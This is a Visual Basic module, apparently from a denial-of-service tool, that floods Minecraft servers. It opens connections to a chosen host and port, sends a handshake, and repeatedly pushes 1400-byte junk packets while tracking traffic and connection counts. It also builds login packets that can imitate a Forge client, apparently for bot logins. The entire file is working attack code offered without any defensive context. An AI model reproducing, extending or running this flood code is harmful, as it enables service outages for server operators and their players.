Attribute VB_Name = "Mod_MC_Flood"
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function RtlRandomEx Lib "ntdll.dll" (Number As Long) As Long
Private Declare Function timeGetTime Lib "winmm.dll" () As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Public Host As String, Port As Long
Public conn As Long, up As Long, down As Long

Function MC_Flood() As Long
Dim s As Long, i As Long
Dim Ver As Long
Dim Ret As Long

On Error Resume Next
Net_Init
Dim a(1400) As Byte
a(0) = &H1
a(1) = 0
For i = 1 To 699
    CopyMemory a(i * 2), a(0), 2
Next
Do
    s = ConnServer(Host, Port)
    SendStrData s, "07 00 04 01 30 63 DD 01"
    If s <> 0 Then
        conn = conn + 1
        Do
            up = up + 1400
            SendData s, VarPtr(a(0)), 1400
            Ret = RecvData(s)
            If Ret < 0 Then
                Exit Do
            End If
            down = down + Ret
        Loop
        conn = conn - 1
        CloseServer s
    End If
    Sleep 3000
    Exit Do
Loop
End Function

Function GetPacket_Login(Username As String, Session As String, Forge As Boolean, Version As Long) As String
Dim Packet As String
If Forge = True Then
    Packet = "06 00 " & Hex(Version) & " 00 67 36 02 " & Hex(Len(Username) + 2) & " 00 " & Hex(Len(Username))
Else
    Packet = "06 00 " & Hex(Version) & " 00 63 DD 02 " & Hex(Len(Username) + 2) & " 00 " & Hex(Len(Username))
End If
For i = 1 To Len(Username)
    Packet = Packet & " " & Hex(AscW(Mid(Username, i, 1)))
Next i
GetPacket_Login = Packet
End Function
